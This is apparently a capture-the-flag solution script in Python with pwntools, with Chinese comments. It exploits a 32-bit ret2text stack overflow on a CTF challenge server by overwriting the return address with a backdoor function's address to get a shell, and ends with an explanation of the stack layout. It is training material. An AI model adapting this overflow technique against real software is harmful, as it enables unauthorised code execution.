from pwn import *

p = remote('pwn.challenge.ctf.show', 28146)

# offset = 0x12 + 4：计算栈溢出的偏移量
# 0x12：缓冲区到saved ebp的距离（比pwn36更小）
# 4：saved ebp的大小（32位程序）
# 总偏移量 = 0x12 + 4 = 0x16，定位到返回地址
offset = 0x12 + 4

# backdoor = 0x8048521：backdoor函数的地址
# 通过IDA分析程序找到的后门函数，直接调用可获得shell
backdoor = 0x8048521

# payload = b'a' * offset + p32(backdoor)：构造攻击载荷
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(backdoor)：将backdoor函数地址打包为32位小端序，覆盖返回地址
# 程序ret时跳转到backdoor函数执行
payload = b'a' * offset + p32(backdoor)

p.sendline(payload)  # sendline会自动添加换行符

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 基础栈溢出
2. 与pwn36的区别：
   - 偏移量不同：0x12 + 4 = 0x16，说明缓冲区更小
   - 使用 sendline 而非 send，会自动添加换行符
3. 核心概念：
   - backdoor函数：程序中预留的后门函数，直接调用可获得shell或flag
   - 通过IDA/GDB分析找到backdoor地址 0x8048521
4. 栈结构（32位）：
   [缓冲区 0x12字节] [saved ebp 4字节] [返回地址 4字节]
   我们需要填充 0x12 + 4 = 0x16 字节到达返回地址位置
5. 利用要点：准确计算偏移量，覆盖返回地址为backdoor地址
"""
